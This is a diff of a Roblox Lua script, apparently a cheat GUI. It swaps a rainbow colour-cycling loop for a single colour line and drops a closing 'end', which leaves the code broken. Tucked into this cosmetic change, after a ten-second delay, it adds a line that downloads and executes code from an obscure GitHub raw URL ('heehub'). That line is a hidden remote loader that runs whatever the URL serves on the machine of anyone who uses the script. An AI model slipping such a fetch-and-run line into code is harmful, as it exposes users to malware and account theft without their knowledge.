@@ -140,46 +140,14 @@ end)
 spawn(function()
     while wait() do
         if game.Workspace:FindFirstChild("LOL") then
-            game.Workspace:FindFirstChild("LOL").Color = Color3.new(255/255,0/255,0/255)
-            for i = 0,255,10 do
-                wait(.1)
-                if game.Workspace:FindFirstChild("LOL") then
-                    game.Workspace:FindFirstChild("LOL").Color = Color3.new(255/255,i/255,0/255)
-                end
-            end
-            for i = 255,0,-10 do
-                wait(.1)
-                if game.Workspace:FindFirstChild("LOL") then
-                    game.Workspace:FindFirstChild("LOL").Color = Color3.new(i/255,255/255,0/255)
-                end
-            end
-            for i = 0,255,10 do
-                wait(.1)
-                if game.Workspace:FindFirstChild("LOL") then
-                    game.Workspace:FindFirstChild("LOL").Color = Color3.new(0/255,255/255,i/255)
-                end
-            end
-            for i = 255,0,-10 do
-                wait(.1)
-                if game.Workspace:FindFirstChild("LOL") then
-                    game.Workspace:FindFirstChild("LOL").Color = Color3.new(0/255,i/255,255/255)
-                end
-            end
-            for i = 0,255,10 do
-                wait(.1)
-                if game.Workspace:FindFirstChild("LOL") then
-                    game.Workspace:FindFirstChild("LOL").Color = Color3.new(i/255,0/255,255/255)
-                end
-            end
-            for i = 255,0,-10 do
-                wait(.1)
-                if game.Workspace:FindFirstChild("LOL") then
-                    game.Workspace:FindFirstChild("LOL").Color = Color3.new(255/255,0/255,i/255)
-                end
-            end
-        end
+            game.Workspace:FindFirstChild("LOL").Color = Color3.new(0,255,255)
     end
 end)      
+              wait(10)
+              
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/asdkoamsdjmasd/free/main/heehub"))()
+
+
 local MainS = win:Server("Main","")
 local Main = MainS:Channel("Main")
 
